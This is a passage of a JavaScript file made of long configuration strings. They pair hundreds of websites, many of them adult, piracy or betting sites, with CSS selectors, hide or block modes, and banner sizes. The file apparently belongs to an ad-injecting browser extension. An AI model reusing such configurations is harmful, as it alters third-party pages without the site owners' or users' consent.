rect-ad"]*""*a**p30download.com*//p30download.com/*""*c**www.wykop.pl*div[id^="banner_top_"]*""*a**www.mamba.ru*div[class^="adv-slide-block-wrapper"]*""*a**3sk.tv*div[class^="banner2"]*""*b**www.donanimhaber.com*div[id^="dha_1_0_876_2_1"]*""*a**www.donanimhaber.com*div[id^="dha_1_0_875_6_1"]*""*a**www.farsnews.com*div[class^="adscolumn"]*""*a**www.cbsnews.com*div[data-component^="smartBanner"]*""*a**www.emol.com*div[class^="publi_"]*""*b**curapelanatureza.com.br*div[id^="block-block-16--2"]*""*a**www.azlyrics.com*div[class^="hidden-xs rect-ad"]*""*a**www.spiegel.de*div[class^="innerwrapad"]*""*b**www.instagram.com*article[class^="_h2d1o"]*padding-bottom:10px;margin-top: -6px;*d*468*60**www.drive2.ru*div[class^="c-block c-block--base"]*margin-bottom:10px;*d*468*60**www.msn.com*div[class^="stripecontainer"]*width:728px;margin:0 auto;*d*728*90**www.flipkart.com*div[class^="_2QUpwp required-tracking"]*height:90px;margin-bottom:10px;*d*728*90**lazada*div[class^="c-layout-container__section c-mp-section"]*margin-top:10px;*d*728*90**www.uol.com.br*.mod-horizontal*margin-top:10px;*d*728*90**seasonvar.ru*header[class^="header"]*width:728px;margin:10px auto;*d*728*90**www.parimatch.by*div[class^="layout-header"]*width:915px;margin:10px auto;*d*915*250**av.by*header[class^="header"]*width:915px;margin:10px auto;*d*915*250**bigcinema.to*div[id^="block_top"]*width:915px;margin:10px auto;*d*915*250**www.mthai.com*section[class^="group-section"]*width:728px;margin:10px auto;*d*728*90**rutracker.org*//rutrk.org/*""*c**www.nuvid.com*www.nuvid.com*""*c**www.porntube.com*/ad_detail*""*c**www.eporner.com*/dot/foot*""*c**www.eporner.com*/dot/ntv*""*c**www.yourlust.com*/im/footer*""*c**hellporno.com*hellporno.com*""*c**xbabe.com*xbabe.com*""*c**www.hd21.com*/hd21*""*c**www.daporn.com*/frames/*""*c**www.fux.com*/ad_detail*""*c**www.avito.ru*div[id^="ads"]*""*b**reddit.com*div[id^="ad_"]*""*b**rutracker.org*div[class^="bn-idx"]*""*b**www.xnxx.com*div[class^="adframeBlock"]*""*b**www.xvideos.com*div[class^="adframeBlock"]*""*b**www.youtube-mp3.org*#rad*""*b**www.pravda.com.ua*div[class^="unit_top-banner_main"]*""*b**znaj.ua*div[class^="znaj-banners"]*""*b**www.unian.net*div[id^="admixer"]*""*b**www.newmovie-hd.com*div[id^="banner"]*""*b**www.newmovie-hd.com*div[class^="execphpwidget"]*""*b**www.khaosod.co.th*div[class^="wpb_single_image wpb_content_element vc_align_center"]*""*b**manager.co.th*div[class^="banner_"]*""*b**www.bangkokpost.com*div[class^="boomboxSize1"]*""*b**thethao247.vn*div[id^="ads_content"]*""*b**www.kp.ru*div[class^="boxFrame"]*""*b**kinogo*div[class^="rek_top"]*""*a**kinogo*div[class^="icons3"]*""*a**yahoo.com*#sticky-lrec2-footer*""*a**hotline.ua*div[id^="top-big-banner"]*""*a**www.movie2free.com*div[class^="notice"]*""*a**www.dek-d.com*div[id^="global-ads"]*""*a**www.dek-d.com*div[id^="click-zone"]*""*a**www.khaosod.co.th*div[class^="td-a-rec td-a-rec-id-ud_b4x_post_ad"]*""*a**www.khaosod.co.th*div[class^="td-a-rec td-a-rec-id-ud_under_menu_post_ad"]*""*a**www.matichon.co.th*div[class^="td-a-rec td-a-rec-id-ud_under_menu_post_ad"]*""*a**bloggang.com*td[class^="bgtopbanner"]*""*a**www.bangkokpost.com*div[id^="survey-popup"]*""*a**mastermovie-hd.com*aside[class^="widget widget-categories"]*""*a**vtv.vn*#vtvAdv_advTop*""*a**nhadatso.com*div[class^="wrapper-col-2"]*""*a**news.am*div[class^="wrapper-col-2"]*background:#fff;*a**news.am*div[class^="partners-articles"]*background:#fff;*a';
    var str_dm_ad_2 = 'toonzaa.com*div[class^="item-wrap clearfix"]*250**espritgames.ru*div[id^="panel-67087-0-0-2"]*200**heavy-r.com*div[class^="content"]*250**mangahome.com*div[class^="manga-recommend recommend-hot"]*250**news.gnezdo.ru*div[class^="gnezdo_other_news"]*200**hdsexdino.com*div[class^="nav top"]*250**pornokivi.net*div[class^="video-overall"]*250**myarena.ru*div[id^="content"]*250**love.ua*div[class^="users-list"]*250**the-rutor.org*div[id^="index"]*200**nld.com.vn*div[class^="contentleft mrthanghoa"]*200**clip16.com*div[class^="wrap wrap_video"]*250**serialytut.club*div[id^="dle-content"]*250**alsoporn.com*div[class^="alsoporn_prevs-col"]*250**playmap.ru*div[class^="catnews"]*200**voyeur-house.tv*div[class^="col-md-8 col-sm-12"]*250**tubedupe.com*div[class^="vidBlock marge20 relative"]*250**startlap.hu*div[id^="structure-container-151"]*600**jw.org*div[class^="groupArticleSidebar clearfix"]*250**coolmath-games.com*div[class^="content-column-wrapper clearfix"]*250**board.orsk.ru*div[class^="container-search"]*90**8next.com*div[id^="sidebar"]*400**rivalo.com*div[class^="margin_r_12"]*200**runetki.com*div[id^="content"]*200**porndig.com*div[class^="main_wrapper"]*250**filmovizija.ws*div[id^="contents"]*250**hqporner.com*div[class^="content content-left"]*250**lambingan.su*div[class^="review-box-container"]*200**ua-cinema.com*div[class^="flexbox"]*200**radikal.ru*div[class^="mainBlockPage f_UploadImg"]*200**samods.ru*div[id^="dle-content"]*200**kinodacha.org*div[class^="content1"]*200**elcomercio.pe*div[class^="flows-grid clearfix dnnstone005"]*250**lapatilla.com*div[class^="cnt_1 cnt_2"]*250**bigmir.net*div[class^="l-content g-clearfix"]*250**samehadaku.net*div[class^="theiaStickySidebar"]*600**mazika2day.com*div[class^="category_search"]*250**myreadingmanga.info*div[class^="site-inner"]*250**xvideosporno.blog.br*div[class^="contentbtm"]*200**xxxmovies.pro*div[class^="prevs-col"]*250**adultmult.tv*div[class^="corpus"]*200**rosszlanyok.hu*div[id^="homeGirlList"]*200**4porn.com*div[class^="nav top"]*250**video.yourbreakingnews.com*div[class^="site-main"]*200**sharkpromotion.net*div[id^="textindex"]*200**112.ua*div[class^="l-main-center"]*90**dojki-hd.com*div[id^="m"]*250**pc-torrents.net*div[class^="col-cont"]*200**uchitelya.com*div[id^="left-content-wrapper"]*250**economictimes.indiatimes.com*div[class^="clearfix page-main-container"]*250**cabinet.ruobr.ru*div[class^="body-block"]*250**voyeurhit.com*div[id^="thumbContainer"]*250**gamebanana.com*div[id^="AtfLeaderboardModule"]*250**63pokupki.ru*div[class^="b-main-search"]*250**sexaraby.info*div[class^="loop-content switchable-view grid-small"]*200**kanobu.ru*section[class^="page-feature-main  page"]*250**ringon.ru*div[class^="main-page"]*250**tonicmovies.com*div[class^="main"]*250**stranamasterov.ru*div[class^="left-corner"]*250**pornoshara.tv*div[class^="center_col"]*250**kinomoov.org*div[class^="rcolomn mainside"]*200**nashol.com*div[class^="nav-menu-class"]*250**brainly.co.id*div[class^="sg-layout__box"]*200**sabwap.co*div[class^="info_item"]*250**amobee.com*section[id^="company"]*250**vojkudee.net*div[class^="container top-container"]*250**vtorrents.net*div[class^="poltabl"]*250**severalmovies.com*div[class^="nav top"]*250**interneturok.ru*div[class^="b-grid_float m-margin_top-medium "]*200**aparat.com*div[class^="index-ad-hot"]*250**dialog.ua*div[class^="main-news-block"]*250**tvhay.org*div[class^="blockbody list"]*250**gametop.com*div[class^="main-body"]*250**cyberleninka.ru*div[class^="main"]*250**rich-birds.org*div[class^="cl-right"]*250**livelib.ru*div[class^="relative-1200"]*250**uchim.org*div[id^="content"]*200**bigkool.net*div[id^="contentGame"]*250**news.detik.com*div[class^="content"]*250**maturetube.com*div[class^="content container"]*200**bibliofond.ru*div[class^="site-content"]*250**megashara.com*div[id^="center-block"]*200**myscore.ua*div[class^="sport_page"]*200**holloporn.com*div[class^="title title-thumbs"]*200**gsmarena.com*div[class^="brandmenu-v2 light l-box"]*400**ibps.in*div[class^="post-5 page type-page"]*200**muyzorras.com*section[class^="c e d1"]*200**scholarships.gov.in*div[class^="dashboard-container"]*250**trinixy.ru*div[id^="pagemain"]*250**poops.pl.ua*div[id^="content_white"]*250**online.zakon.kz*div[id^="pcontent"]*250**torrent-filmi.net*div[id^="content"]*250**24-rus.info*div[class^="all-column"]*250**hi.ru*div[class^="sidebar"]*600**filsex.com*div[id^="mainvideos"]*250**grigorenko-sv.pp.ua*div[id^="midside"]*250**3pornmd.com*div[id^="listResultContainer"]*250**24-rus.info*div[class^="all-column"]*250**filsex.com*div[id^="mainvideos"]*250**grigorenko-sv.pp.ua*div[id^="midside"]*250**3arabicporn.com*section[id^="content"]*200**phimsexsub.com*section[id^="content"]*200**fapality.com*div[class^="row masonry-row"]*200**rosegal.com*div[class^="trend-wrap w1200"]*250**modsgaming.ru*div[id^="casing"]*250**subito.it*div[id^="template_content"]*250**futbol24.com*div[id^="contentleft"]*200**audioknigi-online.com*div[id^="primary"]*250**megaprognoz.ru*div[class^="maintxt"]*200**geometria.ru*div[class^="mainBlogBox"]*250**rutracker.cr*div[id^="forums_list_wrap"]*250**hespress.com*div[class^="features_equal_default"]*200**nickelodeon.ru*div[id^="mtvnContainer"]*250**lovecity3d.com*div[class^="contentIndex"]*250**superpuper.ru*div[id^="content"]*250**ar.y8.com*div[id^="items_container"]*200**planeta-online.tv*div[id^="channel_list"]*250**uhtube.me*div[class^="holder ajax3"]*250**joofaq.ru*div[id^="maininner"]*200**hqhole.com*div[class^="nav top"]*250**toprustory.ru*div[class^="l-main"]*90**playreplay.me*div[class^="content clearfix"]*250**ru.cam4.com*div[id^="directoryHtml"]*250**hoff.ru*div[class^="container clearfix"]*250**eroxxvideos.com*div[class^="holder inverse ajax3"]*200**blitz.bg*div[class^="row main-body"]*250**hypefeeds.com*div[class^="content-loop loop-grid loop-grid1"]*250**dom2.ru*div[class^="n0p6bf7MBkr nHXZUGkP1-i nRFkpJnIJwD nImFXFLWQw4 npbg596"]*250**coffetube.com*div[class^="content"]*250**poimel.co*div[class^="main innerPage nuclear"]*200**poimel.co*div[class^="main nuclear"]*200**streamcomplet.me*div[class^="leftC"]*200**gallery191.com*div[class^="loop-content switchable"]*250**bikroy.com*div[class^="container main"]*250**kolesa-darom.ru*div[id^="content-box"]*200**ru.videosection.com*div[class^="p-section-thumbs-list"]*250**tivix.co*div[id^="dle-content"]*200**1xbet.com*div[class^="sports_widget dashboard"]*200**tyumen.drom.ru*div[class^="b-right-side"]*400**ereko.ru*div[id^="middle"]*250**skidkaonline.ru*div[class^="form-filters form-inline"]*90**xxx5porn.com*div[class^="post_ajax_tm"]*250**sexmup.com*div[class^="box"]*250**wallpaperscraft.com*div[class^="wallpapers"]*250**kapook.com*div[id^="navto-hilight1"]*200**easyen.ru*div[id^="mv_body"]*200**sexzima.net*div[class^="uk-margin"]*250**turpravda.ua*div[class^="main-country-col country-table"]*250**gismeteo.kz*div[class^="cleft"]*250**viks.tv*div[id^="dle-content"]*200**khl.ru*div[id^="top-level-article"]*250**vlphimsex.net*div[id^="main"]*250**liveam.tv*div[class^="col-md-12 col-lg-12"]*250**povar.ru*div[id^="mainWrapper"]*200**oz.by*div[id^="category_goods_container_books"]*200**hdgames.net*div[id^="content-inright"]*200**zaful.com*div[class^="buyer-entrance"]*90**un5.iframe.tvzavr.ru*div[class^="middler_wrap"]*200**loveread.me*div[class^="pageBook"]*200**loveread.me*div[class^="pageBook"]*200**porno-island.org*div[class^="container margin-b40"]*250**sammobile.com*section[id^="mainContent"]*250**light-dark.net*div[id^="replaceeeee1"]*250**sourceforge.net*div[class^="main-content-right"]*250**ru.bongacams.xxx*div[class^="mls_models auto medium"]*200**onona.ua*div[class^="adv-slide-block-wrapper"]*600**finance.i.ua*div[class^="page_content"]*200**deviantart.com*div[class^="browse-results-page"]*250**gitem.co[class^="main_md_back"]*200**fin3x.com*div[class^="nag cf"]*200**coop-land.ru*div[id^="dle-content"]*200**phimsexmoi.biz*div[class^="nag cf"]*200**polnometrazhnoe-porno.video*div[id^="dle-content"]*200**hdkinoteatr.com*div[class^="rightcol"]*400**gidonlinehd.ru*div[class^="art content"]*200**vvb.com.ua*div[class^="main-block"]*250**dndnha.com*div[id^="page_content"]*200**perabet34.com*div[class^="landing-box"]*250**g1.globo.com*div[class^="area-direita-a"]*600**dzmeruk.com*div[id^="nsp-nsp-556"]*200**dzmeruk.com*div[id^="nsp-nsp-556"]*200**pron.tv*div[id^="pronwidgetF"]*250**pornolavka.net*div[id^="dle-content"]*250**novostino.ru*div[class^="layout"]*90**videosdemadurasx.com*div[class^="posts"]*200**computrabajo.com.pe*div[class^="t_log"]*90**mangachan.me*div[id^="side"]*400**computrabajo.com.co*div[class^="t_log"]*90**prothom-alo.com*div[class^="pagemaker"]*250**webtoons.com*div[class^="main_daily_wrap"]*250**sexpip.com*div[class^="HTabblock"]*90**world4ufree.to*div[id^="content"]*250**iceporn.com*div[class^="prime_hold"]*250**pt.chaturbate.com*div[class^="c-1 endless_page_template"]*200**infox.sg*div[class^="inner_layout_top"]*250**3dwarehouse.sketchup.com*div[id^="featured-filmstrips"]*250**pure-t.ru*div[id^="primary"]*250**porn0sex.net*div[class^="heading aft"]*200**origo.hu*div[id^="201785115721"]*200**viho.tv*div[id^="w1"]*200**677spo.com*div[id^="wrapper"]*250**playcast.ru*div[id^="footer-content"]*250**pdalife.ru*section[class^="os-navigation"]*250**swg18.com*div[id^="frameLS2iVK"]*200**laredoute.ru*section[class^="secServices"]*250**gdeposylka.ru*section[class^="main-content"]*250**privat-zapisi.com*div[class^="inner-section-header"]*200**moddb.com*div[class^="body bodysimple clear"]*200**goodreads.com*div[class^="mainContentFloat"]*250**nekto.me*div[id^="content"]*250**gametwist.com*div[class^="js-game-list-main"]*250**swedbank.lv*div[class^="page-content"]*200**kemerovo.drom.ru*div[class^="b-right-side"]*400**18xmov.com*div[id^="main-content"]*200**dom2.fans*div[class^="dr-news-main"]*200**dofiga.net*div[id^="nav_news"]*250**porndoe.com*div[class^="pd-page"]*200**rubook.org*div[id^="posts"]*250**moevideo.net*div[id^="news-blocks"]*250**pornktube.com*div[id^="main_content"]*250**djelfa.info*div[id^="dynamic_box_top"]*250**only-tv.org*div[class^="layout-cell sidebar1"]*600**csgetto.com*div[class^="container mainblock"]*250**flashdozor.ru*div[class^="right-block"]*200**zfilm-hd.club*div[class^="main2"]*250**torrent-baza.com*div[class^="section darken descr clearfix"]*250**video.sibnet.ru*div[id^="day_video_wrapper"]*250**ozon.travel*div[class^="container layout-content"]*250**4ertik.porn*div[id^="dle-content"]*250**evolve-rp.su*div[id^="wrapcentre"]*250**orztoon.tv*div[class^="peliculas"]*200**waxfilm.net*div[class^="content-block"]*200**ru.xhamsterlive.com*div[class^="container model-list-container"]*200**iaai.com*div[class^="featuredSub"]*200**zona.mobi*div[class^="entity-desc-col"]*250**dailymail.co.uk*div[id^="content"]*250**archive.org*div[class^="container container-ia nopad"]*250**imagetwist.com*div[class^="col-xs-12 notice"]*200**new-rutor.org*div[id^="index"]*200**avto.pro*div[class^="framedblock framedblock-info"]*200**bola.net*div[id^="skor-slide"]*250**zcash.flypool.org*div[class^="container-fluid"]*250**gittigidiyor.com*div[class^="gray-content"]*90**tuazar.com*div[id^="seleccionapais"]*250**apteka.ru*div[class^="content content-left"]*250**delfi.lv*div[id^="column1-top"]*200**traveloka.com*div[class^="_2n2vN"]*250**futhead.com*div[class^="row homepage-data margin-t-20"]*250**clipsaoyai.com*div[class^="top_ads clear"]*250**ppt4web.ru*div[class^="column column_8"]*90**novosibirsk.hh.ru*div[class^="index-main-wrapper"]*250**tomsk.drom.ru*div[class^="b-right-side"]*400**gazetevatan.com*div[id^="_top_content_left"]*200**www3.mangafreak.net*div[class^="main_section"]*250**section.cafe.naver.com*div[id^="content"]*250**olx.bg*section[id^="mainpageAds"]*250**mahaxxxporn.com*div[class^="nag cf"]*200**schoollife.org.ua*div[class^="content-wrap"]*200**detik.com*div[class^="content"]*250**nastol.com.ua*div[id^="dle-content"]*250**skyscanner.ru*div[id^="timeline-outer"]*250**indianpornvideos.com*div[class^="main-content-inner"]*200**scoalarutiera.ro*section[class^="margin-bottom css-section"]*250**sciencedirect.com*div[class^="browse js-browse"]*250**gdz4you.com*div[class^="text-justify"]*200**fullhdfilmizlesene.org*div[class^="index-orta normal"]*200**sexhayvc.com*div[class^="nag cf"]*200**pixabay.com*div[id^="gallery"]*250**betscsgo.net*div[class^="left inner"]*250**eredmenyek.com*div[id^="fscon"]*200**xvideos.neswangy.net*div[id^="inner-content"]*200**perabet33.com*div[class^="footer-pro bordertop"]*250**datezone.com*div[class^="card card-gray"]*600**cs-site.ru*div[id^="dle-content"]*200**alphaporno.com*div[class^="center-box"]*200**online-freebee.ru*div[id^="dle-content"]*200**icdrama.se*div[id^="container"]*250**girlsgogames.ru*section[class^="wdg_promotion"]*200**catcut.net*div[class^="services_user_bl_all"]*250**pornoamateurvip.com*section[class^="clfl lst_not"]*250**webtruyen.com*div[class^="w3-col s12 m12 l8"]*250**boyfriendtv.com*div[id^="maincolumn"]*250**jumia.com.ng*div[class^="featured-brands"]*250**porngladiator.com*div[class^="playerwrap"]*250**detali.zp.ua*div[class^="middle"]*250**www4.delapan8.com*div[id^="contentlogin"]*250**ped-kopilka.ru*div[class^="caMainPage"]*250**baigiang.violet.vn*div[class^="frame-main"]*200**21vek.by*div[class^="b-content"]*250**gonzoxxxmovies.com*div[class^="content container"]*250**shahidlive.co*div[id^="mostviews"]*250**krsk.au.ru*div[class^="so-n-blk pad-panel gray94-bkg"]*200**1001goroskop.ru*div[id^="maincenter"]*200**kingsmanga.net*div[class^="sidebar-content"]*600**ru.viptalisman.com*div[class^="align_center red"]*90**kinozz.club*div[class^="left_side"]*400**publi24.ro*div[class^="small-12 columns homepage-ads"]*200**flashresultats.fr*div[class^="table-main"]*200**wowcams.com*div[class^="outer-div"]*250**autopiter.ru*div[class^="p10"]*250**alldz.net*div[class^="st_all"]*200**blablacar.com.ua*div[class^="HomeBlock-inner HomeBlock-pattern"]*200**botanam.net*div[class^="col-lg-12 main-table"]*200**belmeta.com*div[class^="p-home"]*250**resheba.net*div[class^="bg-icon1"]*250**myvideo.ge*div[id^="mv-feed-data-holder"]*250**porn-wanted.com*div[class^="thumbs-block"]*250**novakom.com.ua*div[class^="col-md-6"]*200**pelisplus.tv*div[id^="servidores"]*200**stoboi.ru*div[class^="boxcontent"]*200**ewatchseries.to*div[class^="home-page-right"]*600**gamesbarq.com*div[class^="categoryGame"]*200**wallpaperscraft.ru*div[class^="content-main"]*250**mangahere.co*section[class^="main clearfix"]*250**nonograms.ru*div[class^="index_panel"]*250**elwatannews.com*div[class^="full-under-slider"]*250**s+ending.gov.ua*div[class^="wSize b_biggest_transaction"]*250**tizam.tv*div[class^="main_content"]*250**ulan-ude.house2you.ru*div[class^="search-simple2"]*250**ma-sh.info*div[id^="main-content"]*250**car.gr*div[id^="latest_clsfds"]*250**id.hao123.com*div[id^="fis_sortarea"]*250**habarovsk.drom.ru*div[class^="b-right-side"]*400**eroprofile.com*div[class^="photoGrid"]*200**ua.jooble.org*div[class^="gb_conatiner"]*90**hangngon.net*div[class^="a-breadcrumb"]*250**ru.jobsora.com*div[id^="yw0"]*250**lun.ua*div[class^="global-wrapper global-wrapper_with-sticky"]*250**ngoisao.net*div[id^="box_fulltin"]*250**football.sport.ua*section[class^="col-1"]*200**ru.autoplius.lt*div[class^="main-slidepanel"]*250**torrentiko.net*div[class^="blcon"]*400**hot-sex-tube.com*div[id^="content"]*250**zalukaj.com*div[id^="index_content"]*200**funpay.ru*div[class^="showcase lot"]*250**kinoclub.tv*div[class^="site-content"]*250**discogs.com*div[id^="search_results"]*200**tivizor.ru*div[class^="block-news"]*250**russkoe-porno.xxx*div[class^="floats clearfix"]*200**gledalica.com*div[id^="index_new_videos"]*200**dota2.ru*div[class^="main-b-left"]*200**forum.gtarp.ru*div[class^="sidebar"]*400**gisher.org*div[class^="portal-right-column"]*200**almstba.tv*div[class^="col-md-8"]*200**kashtanka.tv*div[class^="list_videos"]*250**g2a.com*div[id^="content-tabs"]*90**worldofmods.ru*div[class^="category-wrapper"]*200**ru.turbo.az*div[class^="page-content"]*250**keepvid.com*div[class^="support-sites"]*250**epicgames.com*div[class^="row copyright"]*250**eva.vn*div[class^="newsList"]*250**mangareader.net*div[id^="latestchapters"]*200**politikus.ru*div[id^="right"]*400**planetlagu.site*div[class^="ktz-aftermenubanner"]*250**globoesporte.globo.com*div[class^="row medium-collapse large-uncollapse"]*250**opt.euroauto.ru*div[class^="anti-joomla"]*250**1xbetua.com*div[id^="sports_main"]*200**flashscore.ro*div[id^="fsbody"]*200**lalafo.kg*div[id^="premium-container"]*250**dev.namba.kg*div[class^="links-row"]*250**rus-tv.su*div[class^="block-news"]*250**rg-mechanics.org*div[class^="left_bg_rr"]*600**samp-rp.su*div[id^="wrapcentre"]*250**modelx.org*div[class^="wrap-content"]*250**bioskopkeren.ws*div[class^="leftC"]*200**torrentino.com*div[class^="plate showcase"]*200**likebk.com*div[id^="content"]*250**hdreactor.info*div[id^="dle-content"]*250**happyhey.com*div[class^="grid"]*250**pidruchnyk.com.ua*div[id^="category-blocks"]*250**dictionary.cambridge.org*div[class^="cdo-tpl__z cdo-tpl-home__z1"]*250**interpals.net*div[id^="indexBotBox"]*200**profitcentr.com*div[id^="maincolumn"]*200**economics.unian.ua*div[class^="big-image-block"]*250**2eroticporn.com*div[class^="loop-content"]*200**sexxxhd.com*div[id^="list_videos_most_popular_videos_items"]*250**ru.jooble.org*div[class^="gb_conatiner"]*250**booking.uz.gov.ua*div[class^="mobile-version"]*250**porn300.com*div[class^="listado-thumbs"]*250**game01.ru*div[class^="gamesTileWraper"]*200**vkusporno.com*div[id^="thumb"]*200**gismeteo.by*div[class^="readmore __frame"]*200**adveric.net*div[class^="page-content-wrapper"]*250**mylust.com*div[class^="span1"]*600**sitepokupok.ru*div[class^="pagelogo"]*200**phimsd.org*div[class^="nag cf"]*200**osu.ppy.sh*div[class^="content-with-bg"]*200**2youhd.com*div[class^="leftC"]*250**ncbi.nlm.nih.gov*div[class^="subfooter"]*250**pacogames.com*div[id^="gameparent"]*200**entertain.teenee.com*div[id^="fh5co-main"]*250**ctc.ru*div[class^="inner-container"]*250**rus24.tv*div[id^="content2"]*200**tap.az*div[class^="products-container products-container_vip"]*200**thanhnien.vn*div[class^="site-wrap inner"]*200**pornboil.com*div[class^="previews-block"]*250**bravoporn.com*div[class^="bravo-vids"]*250**autodoc.ru*div[id^="lblContent"]*200**kino-max.com*div[id^="dle-content"]*200**eurosport.ru*div[id^="navtab_storylist_featured"]*200**live.cima4u.tv*div[class^="episodesList"]*250**dvlottery.state.gov*div[class^="panel-body p5555"]*250**omgnews.today*div[class^="vc_row wpb_row td-pb-row td-ss-row"]*250**tabletki.ua*div[id^="main-container"]*250**hitomi.la*div[class^="content"]*250**petersburgedu.ru*div[class^="container index services-hotlinks"]*250**01net.com*div[class^="infiscroll content_full_size"]*250**velikan-slot.org*div[class^="game-list__list"]*250**ww3.gogoanime.io*div[class^="last_episodes loaddub"]*200**9xmovies.info*section[class^="home-wrapper thumbnail-wrapper"]*200**tsn.ua*div[class^="navbar navbar-default"]*200**hltv.org*div[class^="index"]*200**ebuxa.net*div[id^="Slideshow"]*200**ukrlib.com.ua*div[class^="collapsebook"]*250**getintopc.com*div[class^="posts clear-block"]*250**vsitv.org*div[class^="gl1"]*200**lroza.com*div[id^="secondary"]*600**modxvm.com*div[class^="entry-content"]*250**ok-tv.org*div[class^="layout-cell sidebar1"]*400**roksa.pl*div[id^="anons_group"]*250**porngrace.com*div[class^="thumbs-container"]*250**topvideos88.org*div[class^="box_video"]*200**vlkgoplay.com*div[class^="game-list__list"]*250**testsuper.su*div[class^="lst-tests lst-tests--ad"]*250**javsex.net*div[class^="main-description"]*250**new.favorit.com.ua*div[class^="column--container"]*250**dovidka.biz.ua*div[class^="new-posts widget"]*200**ratel.kz*div[class^="col-sm-3 col-sm-pull-3"]*400**tl.rulate.ru*div[id^="f-hot"]*90**ru.freepik.com*div[class^="images imageList"]*200**69tubesex.com*div[id^="gallery"]*200**cbr.ru*div[class^="widgets-draggable ui-sortable"]*200**blic.rs*div[class^="sH_bottom_first"]*200**buddywow.com*div[id^="main_content"]*250**petrol.porn*div[class^="tmb_block"]*250**russia.tv*div[class^="b-video-slider"]*200**yaoichan.me*div[id^="side"]*400**geo.saitebi.ge*div[id^="content"]*200**panet.co.il*div[class^="panet-row panet-top-grid"]*250**fastcup.net*div[class^="right_col_textbox"]*250**best-trailer.ru*div[class^="full_rows"]*250**svitppt.com.ua*div[class^="span12 a-kategoria"]*200**vkisku.com*div[id^="dle-content"]*250**scholarship.up.nic.in*section[class^="featured section-padding"]*250**glavcom.ua*section[class^="main_section"]*90**avgle.com*div[class^="video-container"]*250**rickandmorty.cn-fan.ru*div[id^="leftContent"]*200**wino.org.pl*div[class^=" col-xs-12 col-sm-6 col-md-8"]*200**xxxdan.com*div[class^="panel-body-wide"]*250**voirfilms.info*div[class^="left-content"]*250**parivahan.gov.in*section[id^="block-block-9"]*90**reibert.info*div[id^="productListBlock"]*250**banggood.com*div[id^="recommendations"]*250**komus.ru*div[class^="b-rightPane"]*200**vseinstrumenti.ru*div[class^="o-h pdl-20 pdt-10"]*200**trucksimulator2.ru*div[id^="center-block"]*250**crossout.net*div[class^="blocks__block block --about"]*250**sonorousporn.com*div[class^="thumbs-bl"]*250**press-mir.com*div[id^="thumbs-bl"]*250**press-mir.com*div[id^="js-dhtml-sub-block-3-wrapper"]*250**xmovies1.com*div[id^="content"]*250**turkiye.gov.tr*div[id^="miniBannersBlock"]*250**newstube.ru*div[class^="home-items-line1 themes"]*250**mover.uz*div[id^="home-popular"]*250**povarenok.ru*div[class^="newslist"]*200**melodrama1.com*div[id^="content"]*200**filmezz.eu*div[class^="top-commercial"]*250**xcadr.com*div[class^="main-container"]*200**livejasmin.com*div[class^="single biopage_content"]*250**hdkinomax.tv*div[id^="left-side"]*400**trudvsem.ru*section[class^="colored-links clearfix"]*250**stackoverflow.com*div[id^="mainbar"]*90**vl1.iframe.tvzavr.ru*div[class^="middler_wrap"]*200**video.supernewschannel.com*div[class^="widget-area"]*600**alxxxhub.com*div[class^="wrapper row3"]*250**rus-porno.org*div[class^="speedbar-sort clearfix"]*250**krasnoyarsk.drom.ru*div[class^="tireScroll b-tire-scroll"]*250**yagdz.com*div[class^="art-sidebar1"]*400**filma24.tv*div[id^="movie-grid"]*250**crm.supermamki.ru*div[id^="wrapcentre"]*250**ar.bongacams.com*div[class^="mls_models auto medium"]*200**vladivostok.drom.ru*div[class^="tireScroll b-tire-scroll"]*250**moslife.net*div[class^="blog-featured"]*250**banatstylegames.com*div[id^="content_block"]*200**stranamam.ru*div[id^="main-b"]*200**stranamam.ru*div[id^="main-b"]*200**fantasy-worlds.org*div[class^="rightBlock"]*90**rosserial.net*div[class^="serials-content"]*200**gdzlol.org*div[class^="wrapper"]*250**flv2mp3.org*div[id^="related-container"]*200**cashcubator.com*div[class^="shop__part clearfix"]*200**violympic.vn*div[class^="col col-760"]*250**onlinefucktube.com*section[class^="content content--two-sidebars"]*250**accuweather.com*div[class^="column-1 clearfix"]*200**sovet.kidstaff.com.ua*div[id^="maincontainer"]*200**net.adjara.com*div[id^="MainContent"]*250**oblenergo.odessa.ua*div[class^="jumbotron top-space"]*250**coub.com*div[class^="stories-block__container"]*600**new-mastermovie.com*div[class^="item-wrap clearfix"]*200**uslugi.mosreg.ru*div[id^="tiles-container"]*250**ashemaletube.com*div[id^="maincolumn"]*250**filmeonline.biz*aside[id^="sidebar"]*600**goodfon.ru*div[class^="grid_12 menu_l"]*250**azino888-12.com*div[class^="content-centre"]*200**panzoid.com*div[id^="creations"]*200**sex4arabxxx.com*div[class^="vc_row wpb_row vc_inner"]*200**anybunny.com*div[class^="main"]*250**xcraft.ru*section[class^="block-left forum"]*250**avito.ma*div[class^="hRecItemsHP"]*250**golden-tea.com*div[class^="page"]*250**russian7.ru*div[class^="posts-wrapper clearfix"]*250**ikman.lk*div[class^="home-info row lg-g"]*90**moyareklama.ru*div[class^="top_block ar_groups"]*200**videouroki.net*div[class^="wrp small__select"]*250**videobokepsex.co*div[id^="content-container"]*90**section.blog.naver.com*div[id^="content"]*90**mismarcadores.com*div[id^="fscon"]*200**vi.y8.com*div[class^="box items-grid"]*200**bbs.ruliweb.com*div[class^="main_center_inner"]*250**forumodua.com*div[class^="body_wrapper"]*200**likar.info*div[class^="w1200  section--wide--grey"]*250**e-klase.lv*div[class^="recent_articles"]*200**career.ru*div[class^="vod vod_career"]*250**muzofond.org*div[class^="module-letters"]*250**manga-online.biz*div[class^="ui stackable grid"]*250**cinecalidad.to*div[id^="content_inside"]*250**nexusmods.com*div[class^="index-game-list"]*250**web2edu.ru*div[id^="subcell_body"]*250**smotri.com*div[id^="Categories"]*250**batsa.me*div[class^="video_play"]*250**limundo.com*div[class^="right_holder col-sm-4"]*400**repelis.tv*div[class^="showpost4 posthome"]*200**gamestorrents.io*div[class^="boxedbux last_pc_games"]*200**lichess.org*div[class^="content is2d"]*250**o2tvseries.com*div[class^="data_list"]*250**gamelayer.ru*div[class^="topic-content text"]*200**seedmov18.com*div[class^="loop-content switchable-view grid-small"]*200**es.ninemanga.com*div[class^="leftbox"]*200**jerkhour.com*div[class^="video-block"]*250**doubleclickbygoogle.com*section[class^="module solutions"]*250**vip.siom-shoes.com*section[id^="preview"]*250**my-tfile.org*div[id^="table_reduser"]*90**busters.porn*div[class^="thumbs-block"]*250**natashaclub.com*div[id^="ContentDiv"]*250**cda.pl*div[class^="DefaultSFont"]*200**tuberel.com*div[class^="mholder"]*200**russian.rt.com*div[class^="layout__content "]*250**jofogas.hu*div[class^="col-xs-12 block 